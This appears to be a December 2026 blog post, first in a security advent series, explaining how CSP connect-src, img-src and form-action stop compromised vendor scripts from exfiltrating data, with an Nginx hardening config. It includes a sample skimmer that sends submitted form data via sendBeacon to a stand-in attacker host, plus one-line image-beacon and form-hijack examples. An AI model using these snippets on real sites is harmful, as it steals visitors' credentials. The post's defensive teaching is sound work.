---
title: "CSP connect-src Isn't Optional: Stopping Compromised Third-Party Scripts"
description: "Allowlisting a vendor <script> in script-src isn't enough. Locking down connect-src prevents a compromised third-party script from exfiltrating scraped data to attacker-controlled domains."
pubDate: 2026-12-01
tags: ["security", "csp", "frontend", "xss"]
series: "advent-2026"
adventDay: 1
draft: false
---

Most engineering teams treat **Content Security Policy (CSP)** as a binary defense against Cross-Site Scripting (XSS): lock down `script-src`, allowlist your CDN and analytics provider, and call it a day.

Unfortunately, modern client-side compromises rarely rely on injecting a brand-new `<script>` tag into your DOM. Instead, attackers compromise a vendor you already trust—an A/B testing snippet, customer chat widget, or telemetry SDK already present in your `script-src` allowlist.

> **Real-World Receipt (Nov 2026):** During the Optimizely supply-chain attack that hit **178 major sites**, attackers piggybacked on an already-trusted script origin. Post-incident analysis showed that **only 15% of affected sites** had a strict enough CSP (`connect-src`, `form-action`, and `img-src`) to block payload delivery and data exfiltration once the vendor bundle executed.

Once malicious code executes inside an allowlisted script, `script-src` has already done its job and stepped aside. What stops that payload from harvesting session tokens, form inputs, or PII from `localStorage` and shipping them to an attacker-controlled drop server?

**The answer is `connect-src`.**

---

## The Anatomy of a Third-Party Exfiltration Attack

Suppose your marketing site or web application loads an A/B testing script from `https://cdn.trusted-ab-test.example/sdk.js`. Because your team needed that script to run, your CSP includes:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted-ab-test.example;
```

Wait—what happens if you omit `connect-src`, or worse, set `connect-src *` because a developer got tired of CORS/CSP console errors during local testing?

1. While `default-src 'self'` acts as a fallback for `connect-src`, many production policies explicitly widen `connect-src` to `https:` or `*` to accommodate dynamic API endpoints and third-party telemetry beacons.
2. If `sdk.js` is compromised upstream (Magecart-style supply-chain attack), the injected JavaScript runs with full access to the page context.
3. The malicious payload attaches an event listener to checkout or login forms and exfiltrates credentials via `fetch()`, `XMLHttpRequest`, `navigator.sendBeacon()`, or `WebSocket`:

```javascript
// Malicious payload inside a compromised 3rd-party analytics bundle
document.querySelector('form')?.addEventListener('submit', (event) => {
  const formData = Object.fromEntries(new FormData(event.target));
  navigator.sendBeacon(
    'https://collector.attacker-controlled.example/ingest',
    JSON.stringify({
      origin: window.location.origin,
      payload: formData,
    })
  );
});
```

---

## How `connect-src` Blocks the Exfiltration Channel

The `connect-src` directive restricts the URLs which can be loaded using script interfaces:

- `fetch()` and `XMLHttpRequest`
- `navigator.sendBeacon()`
- `WebSocket` (`ws:` / `wss:`)
- `EventSource` (Server-Sent Events)
- `<a ping>` Auditing

When you explicitly lock `connect-src` to the exact origins that receive telemetry or API calls, the browser blocks any network request to an unlisted domain—even when initiated by an allowlisted script.

| API / Mechanism | Governed by `script-src`? | Governed by `connect-src`? |
| :--- | :--- | :--- |
| `<script src="...">` | Yes | No |
| `fetch()` / `XHR` | No | **Yes** |
| `navigator.sendBeacon()` | No | **Yes** |
| `new WebSocket(...)` | No | **Yes** |
| `new EventSource(...)` | No | **Yes** |

---

## Production-Ready Nginx Configuration

Below is a hardened Nginx configuration snippet that enforces a strict `connect-src` allowlist alongside essential browser security headers:

```nginx
server {
    listen 443 ssl http2;
    server_name hristov.dev;

    # Strict Content Security Policy with explicit connect-src boundary
    set $csp_default  "default-src 'self';";
    set $csp_script   "script-src 'self' https://cdn.trusted-ab-test.example;";
    set $csp_style    "style-src 'self' 'unsafe-inline';";
    set $csp_img      "img-src 'self' data:;";
    set $csp_font     "font-src 'self';";
    set $csp_connect  "connect-src 'self' https://telemetry.trusted-ab-test.example;";
    set $csp_hardening "object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;";

    add_header Content-Security-Policy "${csp_default} ${csp_script} ${csp_style} ${csp_img} ${csp_font} ${csp_connect} ${csp_hardening}" always;

    # Defense-in-depth companion headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
```

---

## Don't Forget Non-`connect-src` Exfiltration Vectors

A determined attacker blocked by `connect-src` will immediately fall back to secondary exfiltration channels:

1. **Image Beacons (`new Image().src = 'https://attacker.example/?d=' + data`):** Prevent this by never setting `img-src *` or `img-src https:`. Keep `img-src 'self' data:` (plus your explicit image CDN).
2. **Form Hijacking (`form.action = 'https://attacker.example'`):** Always specify `form-action 'self'`, which does **not** fall back to `default-src`!
3. **DNS Prefetch / Dynamic Link Injection:** Restrict `default-src 'self'` and monitor violations with `report-to` or `report-uri`.

### Key Takeaway for Day 01

Never use `connect-src https:` or `connect-src *` in production. Separate the origin hosting a third-party script (`script-src`) from the exact ingestion endpoint (`connect-src`), and pair it with strict `img-src` and `form-action` directives to close the exfiltration loop.

---

## Social Summary (X & LinkedIn)

```text
2FA on. Servers patched. CI security checks green.
Then a 3rd-party A/B testing script compromises 178 major sites overnight—and only 15% had a strict enough CSP to block data exfiltration.

Day 01/24 of the 2026 DevSec Advent Calendar: Why CSP `connect-src` (paired with `form-action` and `img-src`) is your last line of defense when a trusted vendor script turns hostile.
```
